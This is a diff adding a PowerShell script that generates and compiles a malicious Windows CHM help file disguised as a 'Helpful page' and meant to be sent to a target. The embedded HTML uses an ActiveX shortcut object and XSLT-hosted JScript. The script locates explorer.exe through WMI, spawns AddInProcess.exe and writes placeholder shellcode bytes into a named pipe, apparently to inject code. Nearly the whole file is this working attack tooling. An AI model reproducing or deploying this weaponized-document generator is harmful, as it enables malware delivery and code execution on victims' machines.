@@ -1,0 +1,142 @@
+$Outputpath = "C:\temp"
+   
+#Create the table of contents for the CHM
+$CHMTableOfContents = @"
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<HEAD>
+<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
+<!-- Sitemap 1.0 -->
+</HEAD><BODY>
+  <UL>
+  <LI> <OBJECT type="text/sitemap">
+      <param name="Name" value="Help page">
+      <param name="Local" value="doc.htm">
+  </OBJECT>
+  </UL>
+</BODY>
+</HTML>
+"@
+
+#Create the Project file for the CHM
+$CHMProject = @"
+[OPTIONS]
+Contents file=$OutputPath\doc.hhc
+[FILES]
+$OutputPath\doc.htm
+"@
+    
+$CHMHTML1 = @"
+    <HTML>
+    <TITLE>Manual</TITLE>
+    <HEAD>
+    </HEAD>
+    <BODY>
+
+
+<div id="z">.</div>
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+<PARAM name="Command" value="ShortCut">
+<PARAM name="Button" value="Bitmap::shortcut">
+<PARAM name="Item1" value="273,1,1">
+</OBJECT>
+
+
+<SCRIPT>
+var XSLT="";
+XSLT = XSLT + "<?xml version='1.0'?>"+'\n';
+XSLT = XSLT + '<stylesheet'+'\n';
+XSLT = XSLT + 'xmlns="http://www.w3.org/1999/XSL/Transform"'+'\n';
+XSLT = XSLT + 'xmlns:ms="urn:schemas-microsoft-com:xslt"'+'\n';
+XSLT = XSLT + 'xmlns:user="placeholder"'+'\n';
+XSLT = XSLT + 'version="1.0">'+'\n';
+XSLT = XSLT + '<output method="text"/>'+'\n';
+XSLT = XSLT + '    <ms:script implements-prefix="user" language="JScript">'+'\n';
+XSLT = XSLT + '        <![CDATA['+'\n';
+XSLT = XSLT + 'function getProc(procName)'+'\n';
+XSLT = XSLT + '{'+'\n';
+XSLT = XSLT + 'var loc = new ActiveXObject("WbemScripting.SWbemLocator");'+'\n';
+XSLT = XSLT + 'var svc = loc.ConnectServer();'+'\n';
+XSLT = XSLT + 'coll = svc.ExecQuery("select * from Win32_Process");'+'\n';
+XSLT = XSLT + 'var e = new Enumerator(coll);'+'\n';
+XSLT = XSLT + 'for (; !e.atEnd(); e.moveNext()) {'+'\n';
+XSLT = XSLT + 'var p = e.item ();'+'\n';
+XSLT = XSLT + 'curproc = p.Name.toLowerCase();'+'\n';
+XSLT = XSLT + 'if (curproc == procName) {'+'\n';
+XSLT = XSLT + 'return p.ProcessId;'+'\n';
+XSLT = XSLT + '}'+'\n';
+XSLT = XSLT + '}'+'\n';
+XSLT = XSLT + 'return 0;'+'\n';
+XSLT = XSLT + '}'+'\n';
+XSLT = XSLT + 'try {'+'\n';
+XSLT = XSLT + 'var intProcessID = getProc("explorer.exe");'+'\n';
+XSLT = XSLT + '            var locator = new ActiveXObject("WbemScripting.SWbemLocator");'+'\n';
+XSLT = XSLT + '            var service = locator.ConnectServer();'+'\n';
+XSLT = XSLT + '            service.Security_.ImpersonationLevel = 3;'+'\n';
+XSLT = XSLT + '            var startup = service.Get("Win32_ProcessStartup");'+'\n';
+XSLT = XSLT + '            var instance = startup.SpawnInstance_();'+'\n';
+XSLT = XSLT + '            instance.ShowWindow = 12;'+'\n';
+XSLT = XSLT + '            var pid;'+'\n';
+XSLT = XSLT + '            var process = service.Get("Win32_Process");'+'\n';
+XSLT = XSLT + '            var cmdline = "C:\\\\Windows\\\\Microsoft.Net\\\\Framework64\\\\v4.0.30319\\\\AddInProcess.exe /guid:32a91b0f-30cd-4c75-be79-ccbd6345de99 /pid:"+intProcessID;'+'\n';
+XSLT = XSLT + '            var error = process.Create(cmdline, null, instance, pid);'+'\n';
+XSLT = XSLT + '} catch(e) {'+'\n';
+XSLT = XSLT + '}'+'\n';
+%BYTES%+']'+'\n';
+
+XSLT = XSLT + 'var ct = 0;'+'\n';
+XSLT = XSLT + 'while(ct < 11000000)'+'\n';
+XSLT = XSLT + '{'+'\n';
+XSLT = XSLT + '    ct++;'+'\n';
+XSLT = XSLT + '}'+'\n';
+
+XSLT = XSLT + 'var f = new ActiveXObject("Scripting.FileSystemObject");' +'\n';
+XSLT = XSLT + 'var t = f.CreateTextFile("\\\\\\\\\.\\\\pipe\\\\32a91b0f-30cd-4c75-be79-ccbd6345de99", true, false);'+'\n';
+XSLT = XSLT + 'for(i in rawData) {'+'\n';
+XSLT = XSLT + '   t.Write(String.fromCharCode(rawData[i]));'+'\n';
+XSLT = XSLT + '}'+'\n';
+XSLT = XSLT + 't.Close();'+'\n';
+
+XSLT = XSLT + '        ]]>'+'\n';
+XSLT = XSLT + '   </ms:script>'+'\n';
+XSLT = XSLT + '</stylesheet>'+'\n';
+var XML = new ActiveXObject("Microsoft.XMLDOM.1.0");
+XML.async = false;
+XML.loadXML(XSLT);
+XML.transformNode(XML);
+x.Click();
+
+ </SCRIPT>
+
+<table border="0" class="utilcaption" cellspacing="3">
+<tr><td>
+<td>Some Helpful page
+<br>
+Copyright (c) 2022 - 2023 Lefty - @lefterispan
+<br>
+</table>
+
+<p>
+
+<p>
+
+</content></div></div><hr /><p /></div></body></html>
+</BODY>
+</HTML>
+"@
+
+    #Write all files to disk for compilation
+    Out-File -InputObject $CHMTableOfContents -FilePath "$OutputPath\doc.hhc" -Encoding default
+    Out-File -InputObject $CHMHTML1 -FilePath "$OutputPath\doc.htm" -Encoding default
+    Out-File -InputObject $CHMProject -FilePath "$OutputPath\doc.hhp" -Encoding default
+    
+    #Compile the CHM, only this needs to be sent to a target.
+    $HHCPath = "C:\Program Files (x86)\HTML Help Workshop"
+    $HHC = "$HHCPath" + "\hhc.exe"
+    & "$HHC" "$OutputPath\doc.hhp"
+
+    #Cleanup
+    Remove-Item "$OutputPath\doc.hhc"
+    Remove-Item "$OutputPath\doc.htm"
+    Remove-Item "$OutputPath\doc.hhp"
+   
